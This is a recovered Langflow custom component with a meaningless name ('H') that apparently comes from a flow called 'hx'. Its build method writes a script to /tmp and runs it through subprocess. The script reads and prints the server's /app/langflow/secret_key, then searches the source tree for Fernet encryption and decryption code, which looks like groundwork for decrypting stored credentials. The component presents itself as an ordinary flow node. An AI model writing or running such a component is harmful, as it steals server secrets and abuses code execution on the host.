# Recovered Langflow component
# type: H
# class: H
# used in 1 flow(s): hx
# json path: node.data.node.template.code.value


from langflow.custom import Component
from langflow.io import Output, MessageTextInput
from langflow.schema.message import Message
import subprocess
class H(Component):
    display_name="H"
    description="d"
    icon="code"
    name="H"
    inputs=[MessageTextInput(name="input_value", display_name="Input", value="x")]
    outputs=[Output(name="output", display_name="Output", method="build_out")]
    def build_out(self) -> Message:
        py=r"""
secret=open('/app/langflow/secret_key').read().strip()
print('SECRET',secret)
import os,sys
sys.path.insert(0,'/app/src')
# find encrypt
import subprocess
print(subprocess.getoutput("python -c \"import pkgutil,langflow; import langflow as l; print(l.__file__)\""))
print(subprocess.getoutput("grep -Rn \"class.*Fernet\\|def encrypt\\|def decrypt\\|Fernet(\" /app/src --include='*.py' 2>/dev/null | head -40"))
"""
        open('/tmp/hx.py','w').write(py)
        return Message(text=subprocess.getoutput('python /tmp/hx.py'))
